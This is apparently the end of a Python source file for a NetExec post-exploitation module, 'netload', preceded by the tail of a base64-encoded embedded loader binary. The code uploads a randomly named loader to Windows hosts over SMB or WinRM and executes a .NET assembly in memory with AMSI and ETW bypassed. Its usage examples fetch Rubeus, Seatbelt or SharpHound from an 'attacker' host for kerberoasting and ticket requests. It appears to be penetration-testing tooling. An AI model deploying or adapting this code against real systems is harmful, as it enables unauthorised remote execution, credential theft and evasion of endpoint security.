    "AQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADAALgAwAC4AMAAuADAAAABIABMAAQBJAG4AdABl"
    "AHIAbgBhAGwATgBhAG0AZQAAAE4AZQB0AEwAbwBhAGQAZQByAF8AbwByAGkAZwBpAG4AYQBsAAAA"
    "AAAoAAIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAAAgAAAALAACAAEATABlAGcAYQBs"
    "AFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAACAAAABYABcAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwA"
    "ZQBuAGEAbQBlAAAATgBlAHQATABvAGEAZABlAHIAXwBvAHIAaQBnAGkAbgBhAGwALgBlAHgAZQAA"
    "AAAAJAACAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAAAgAAAAKAACAAEAUAByAG8AZAB1AGMA"
    "dABWAGUAcgBzAGkAbwBuAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAMAAAAwDcAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
)


class NXCModule:
    """In-memory .NET assembly execution via NetLoader.

    Uploads NetLoader to a target, then uses it to fetch and execute a .NET
    assembly in-memory with AMSI and ETW patched. Supports XOR-encrypted
    payloads, local file uploads, and automatic cleanup.

    Module by @Squ1shification
    Based on NetLoader by @Flangvik
    """

    name = "netload"
    description = "In-memory .NET assembly execution via NetLoader with AMSI/ETW bypass"
    supported_protocols = ["smb", "winrm"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.url = None
        self.local = None
        self.args = ""
        self.xor_key = None
        self.loader_path = None
        self.cleanup = False
        self.timeout = 30
        self.upload_dir = "Windows\\Temp"
        self.loader_name = None

    def options(self, context, module_options):
        r"""
        URL             URL of the .NET assembly to load in-memory (use URL or LOCAL, not both)
        LOCAL           Local path to a .NET assembly on the attacking machine (uploaded then loaded)
        ARGS            Arguments passed to the loaded assembly (preserved as-is, no splitting)
        XOR_KEY         XOR decryption key if the payload is encrypted (optional)
        LOADER          Local path to a custom NetLoader binary (optional, embedded loader used by default)
        UPLOAD_DIR      Remote staging directory relative to C:\ (default: Windows\Temp)
        TIMEOUT         Command execution timeout in seconds (default: 30)
        CLEANUP         Remove any previously staged loaders from the target (skips execution)
        LOADER_NAME     Exact filename to remove during cleanup (if you lost the random name)

        Examples:
            nxc smb 10.0.0.0/24 -u admin -p Pass -M netload -o URL=http://attacker/Seatbelt.exe ARGS="-group=all"
            nxc smb dc01 -u admin -H <hash> -M netload -o URL=http://attacker/Rubeus.exe ARGS="kerberoast /nowrap"
            nxc smb target -u admin -p Pass -M netload -o LOCAL=/opt/SharpHound.exe ARGS="--collectionmethods All"
            nxc winrm target -u admin -p Pass -M netload -o URL=http://attacker/Rubeus.exe ARGS="asktgt /user:svc /rc4:abc123 /nowrap"
            nxc smb target -u admin -p Pass -M netload -o CLEANUP=True
        """
        if "CLEANUP" in module_options and module_options["CLEANUP"].lower() == "true":
            self.cleanup = True
            if "LOADER_NAME" in module_options:
                self.loader_name = module_options["LOADER_NAME"]
            return

        if "URL" not in module_options and "LOCAL" not in module_options:
            context.log.fail("URL or LOCAL option is required")
            sys_exit(1)

        if "URL" in module_options and "LOCAL" in module_options:
            context.log.fail("Specify URL or LOCAL, not both")
            sys_exit(1)

        if "URL" in module_options:
            self.url = module_options["URL"]

        if "LOCAL" in module_options:
            self.local = module_options["LOCAL"]

        if "ARGS" in module_options:
            self.args = module_options["ARGS"]

        if "XOR_KEY" in module_options:
            self.xor_key = module_options["XOR_KEY"]

        if "LOADER" in module_options:
            self.loader_path = module_options["LOADER"]

        if "UPLOAD_DIR" in module_options:
            raw = module_options["UPLOAD_DIR"]
            self.upload_dir = raw.strip("\\/").replace("/", "\\")

        if "TIMEOUT" in module_options:
            try:
                self.timeout = int(module_options["TIMEOUT"])
            except ValueError:
                context.log.fail(
                    f"TIMEOUT must be an integer, got: {module_options['TIMEOUT']}"
                )
                sys_exit(1)

    def _is_smb(self, connection):
        return hasattr(connection, "conn") and hasattr(connection.conn, "putFile")

    def on_admin_login(self, context, connection):
        if self.cleanup:
            self._cleanup(context, connection)
            return

        suffix = gen_random_string(8)
        loader_remote_name = f"svc_{suffix}.exe"

        if not self._upload_loader(context, connection, loader_remote_name):
            return

        payload_remote_name = None
        if self.local:
            payload_remote_name = f"dat_{suffix}.bin"
            if not self._upload_payload(context, connection, payload_remote_name):
                self._delete_file(context, connection, loader_remote_name)
                return

        target_path = self._build_target_path(payload_remote_name)
        cmd = self._build_command(loader_remote_name, target_path)

        context.log.info(f"Executing: {loader_remote_name} -> {target_path}")
        try:
            output = self._execute(connection, cmd)
            if output:
                output = output.strip()
                if self._is_clr_error(output):
                    context.log.fail(
                        "Assembly requires a .NET CLR version not installed on the target"
                    )
                    for line in output.splitlines()[:3]:
                        context.log.fail(f"  {line}")
                else:
                    for line in output.splitlines():
                        context.log.highlight(line)
        except Exception as e:
            err = str(e)
            if self._is_clr_error(err):
                context.log.fail(
                    "Assembly requires a .NET CLR version not installed on the target"
                )
            else:
                context.log.fail(f"Execution failed: {e}")

        if payload_remote_name:
            self._delete_file(context, connection, payload_remote_name)
        self._delete_file(context, connection, loader_remote_name)
        context.log.success("Staged files removed")

    def _is_clr_error(self, text):
        clr_markers = [
            "is not a valid Win32 application",
            "BadImageFormatException",
            "Could not load file or assembly",
            "requires a later version",
            "not a valid .NET assembly",
            "image is built for a",
            "CLR error",
            "Framework initialization error",
        ]
        return any(m.lower() in text.lower() for m in clr_markers)

    def _execute(self, connection, cmd):
        if self._is_smb(connection):
            return connection.execute(
                cmd, True, methods=["wmiexec", "atexec", "smbexec"]
            )
        return connection.execute(cmd, True)

    def _remote_path(self, filename):
        return f"{self.upload_dir}\\{filename}"

    def _full_path(self, filename):
        return f"C:\\{self.upload_dir}\\{filename}"

    def _upload_file(self, context, connection, data, remote_name):
        share_path = self._remote_path(remote_name)

        if self._is_smb(connection):
            connection.conn.putFile("C$", share_path, BytesIO(data).read)
        else:
            b64 = base64.b64encode(data).decode()
            full = self._full_path(remote_name)
            ps = f"[IO.File]::WriteAllBytes('{full}', [Convert]::FromBase64String('{b64}'))"
            connection.execute(ps, False, shell_type="powershell")

    def _upload_loader(self, context, connection, remote_name):
        if self.loader_path:
            loader_data = self._read_local_file(context, self.loader_path)
        else:
            loader_data = self._get_embedded_loader()

        if loader_data is None:
            context.log.fail(
                "No NetLoader binary available. Pass LOADER=/path/to/NetLoader.exe"
            )
            return False

        try:
            self._upload_file(context, connection, loader_data, remote_name)
            context.log.success(f"Uploaded loader as {remote_name}")
        except Exception as e:
            context.log.fail(f"Failed to upload loader: {e}")
            return False
        return True

    def _upload_payload(self, context, connection, remote_name):
        payload_data = self._read_local_file(context, self.local)
        if payload_data is None:
            return False

        try:
            self._upload_file(context, connection, payload_data, remote_name)
            context.log.success(f"Uploaded payload as {remote_name}")
        except Exception as e:
            context.log.fail(f"Failed to upload payload: {e}")
            return False
        return True

    def _build_target_path(self, payload_remote_name):
        if self.url:
            return self.url
        return self._full_path(payload_remote_name)

    def _build_command(self, loader_name, target):
        loader_full = self._full_path(loader_name)
        cmd = f"{loader_full} -v -path {target}"

        if self.xor_key:
            cmd += f" -xor {self.xor_key}"

        if self.args:
            cmd += f" -args {self.args}"

        return cmd

    def _delete_file(self, context, connection, remote_name):
        try:
            if self._is_smb(connection):
                connection.conn.deleteFile("C$", self._remote_path(remote_name))
            else:
                connection.execute(f'del "{self._full_path(remote_name)}"', True)
        except Exception:
            context.log.debug(f"Could not delete {remote_name}")

    def _cleanup(self, context, connection):
        if self.loader_name:
            self._delete_file(context, connection, self.loader_name)
            context.log.success(f"Removed {self.loader_name}")
            return

        try:
            if self._is_smb(connection):
                files = connection.conn.listPath("C$", self._remote_path("svc_*.exe"))
                if not files:
                    context.log.info("No staged loaders found")
                    return
                for f in files:
                    fname = f.get_longname()
                    self._delete_file(context, connection, fname)
                    context.log.success(f"Removed {fname}")
            else:
                output = connection.execute(
                    f'cmd /c dir /b "C:\\{self.upload_dir}\\svc_*.exe" 2>nul',
                    True,
                )
                if not output or not output.strip():
                    context.log.info("No staged loaders found")
                    return
                for fname in output.strip().splitlines():
                    fname = fname.strip()
                    if fname:
                        self._delete_file(context, connection, fname)
                        context.log.success(f"Removed {fname}")
        except FileNotFoundError:
            context.log.info("No staged loaders found")
        except Exception as e:
            context.log.fail(f"Cleanup failed: {e}")

    def _read_local_file(self, context, path):
        try:
            with open(path, "rb") as f:
                return f.read()
        except FileNotFoundError:
            context.log.fail(f"File not found: {path}")
            return None
        except PermissionError:
            context.log.fail(f"Permission denied: {path}")
            return None

    def _get_embedded_loader(self):
        try:
            return base64.b64decode(EMBEDDED_LOADER)
        except Exception:
            return None
